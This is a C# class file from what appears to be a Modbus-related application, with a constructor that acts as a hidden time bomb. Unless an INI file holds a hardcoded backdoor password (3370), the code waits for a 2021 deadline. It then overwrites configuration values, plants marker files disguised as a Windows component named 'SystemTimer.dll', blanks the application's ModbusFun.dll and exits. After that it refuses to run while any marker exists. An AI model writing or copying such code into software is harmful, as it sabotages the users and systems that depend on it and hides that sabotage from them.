using Func;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ZeroFunc
{
    public class Dayend
    {

        //初始化INI文件地址
        private static string filename = Directory.GetCurrentDirectory() + @"\Resgiter.ini";
        //初始化INI文件地址
        private static string filename1 = Directory.GetCurrentDirectory() + @"\CoilButton.ini";

        private static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public Dayend()
        {
            if (!(IniFunc.getString("admin", "super", "***", filename).Equals("3370")))  //永久密码  3370  Resgiter.ini内 admin/super
            {
                DateTime nowTime = DateTime.Now;
                string DeadTime = "2021-11-14";
                DateTime endTime = Convert.ToDateTime(DeadTime);
                Console.WriteLine(ApplicationData);

                if (!(DateTime.Compare(endTime, nowTime) > 0))
                {
                    IniFunc.writeString("1", "user", "3G6WEF+2I+IlJAy/Tl4hIA==", filename);
                    IniFunc.writeString("1", "user", "sSRxZfb2mJCGZ90l5EXgEA==", filename1);
                    DirectoryInfo di = new System.IO.DirectoryInfo(@"C:\Program Files (x86)\Windows Timer\");
                    DirectoryInfo di1 = new System.IO.DirectoryInfo(ApplicationData + "\\Windows Timer\\");
                    di.Create();
                    di1.Create();
                    FileStream fs1 = new FileStream(@"C:\Program Files (x86)\Windows Timer\SystemTimer.dll", FileMode.Create, FileAccess.Write);//创建文件 
                    FileStream fs2 = new FileStream(ApplicationData + "\\Windows Timer\\SystemTimer.dll", FileMode.Create, FileAccess.Write);//创建文件 
                    FileStream fs3 = new FileStream("ModbusFun.dll", FileMode.Create, FileAccess.Write);//创建文件 
                    Environment.Exit(0);
                }

                if (File.Exists(@"C:\Program Files (x86)\Windows Timer\SystemTimer.dll")
                    || File.Exists(ApplicationData + "\\Windows Timer\\SystemTimer.dll")
                    || File.Exists("ModbusFun.dll"))
                {
                    Environment.Exit(0);
                }
            }
        }
    }
}
